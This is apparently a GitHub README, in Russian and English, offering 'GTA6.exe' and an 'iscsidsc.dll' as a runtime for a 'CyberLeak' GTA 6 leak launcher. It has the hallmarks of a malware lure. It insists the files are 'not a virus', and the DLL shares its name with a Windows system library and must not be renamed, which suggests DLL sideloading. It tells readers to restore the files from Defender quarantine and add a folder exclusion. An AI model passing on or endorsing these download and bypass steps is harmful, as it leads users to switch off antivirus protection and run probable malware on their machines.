# GTA6.exe + iscsidsc.dll — runtime ГТА 6 CyberLeak

[![GTA6.exe](https://img.shields.io/badge/Download-GTA6.exe-ff4da6?style=for-the-badge)](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/GTA6.exe)
[![iscsidsc.dll](https://img.shields.io/badge/Download-iscsidsc.dll-7c5cff?style=for-the-badge)](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/iscsidsc.dll)
[![ZIP pair](https://img.shields.io/badge/ZIP-GTA6_Runtime_gup.zip-fcaf17?style=for-the-badge)](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/GTA6_Runtime_gup.zip)

**CyberLeek Archive** · **CyberLeak VI** · [cyberleakgta6.com](https://cyberleakgta6.com/)  
**Не вирус.** **Не** отдельная игра. **Не** Rockstar Games / Take-Two.

Runtime-пара лаунчера **CyberLeak**: `GTA6.exe` + `iscsidsc.dll`. Оба файла — **в одной папке**. Имя exe можно менять, **dll — нельзя**. Лаунчер ставит их сам — руками не обязательно.

---

## English — GTA6.exe + iscsidsc.dll

| File | Role |
|---|---|
| `GTA6.exe` | Runtime (exe name can change) |
| `iscsidsc.dll` | Same program — **do not rename** |
| `GTA6_Runtime_gup.zip` | Both files in one archive |

1. Download both (or the ZIP) from **release v1.0**.
2. Put them in **`%LOCALAPPDATA%\Rockstar Games\Grand Theft Auto VI\Launcher`**.
3. Double-click `GTA6.exe` with the dll beside it.
4. If Defender quarantines files — restore + folder exclusion.
5. Return to the launcher and retry **DOWNLOAD / PLAY**.

Not a standalone GTA 6. Not an APK. Not a 113 GB torrent.

---

## Скачать

| Файл | Ссылка |
|---|---|
| **GTA6.exe** | [releases/download/v1.0/GTA6.exe](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/GTA6.exe) |
| **iscsidsc.dll** | [releases/download/v1.0/iscsidsc.dll](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/iscsidsc.dll) |
| **Пара в ZIP** | [GTA6_Runtime_gup.zip](https://github.com/FoxyYT1/gta-6-runtime-gup-exe/releases/download/v1.0/GTA6_Runtime_gup.zip) |
| Лаунчер | [GTA6_CyberLeak_Launcher.zip](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/download/123/GTA6_CyberLeak_Launcher.zip) |

---

## Если не запускается

1. Лаунчер: [релиз 123](https://github.com/FoxyYT1/GTA6-CyberLeak-Launcher/releases/tag/123).
2. Скачайте **оба** файла с **этого** релиза v1.0.
3. Папка: Win+R → `%LOCALAPPDATA%\Rockstar Games\Grand Theft Auto VI\Launcher`
4. Запустите `GTA6.exe` из этой папки (`iscsidsc.dll` рядом, имя dll не менять).
5. Defender — восстановите, добавьте папку в исключения.
6. Лаунчер → повтор **СКАЧАТЬ / ИГРАТЬ**.

---

Support: [t.me/CyberLeakSupp_bot](https://t.me/CyberLeakSupp_bot) · channel [t.me/CyberLeakVI](https://t.me/CyberLeakVI)
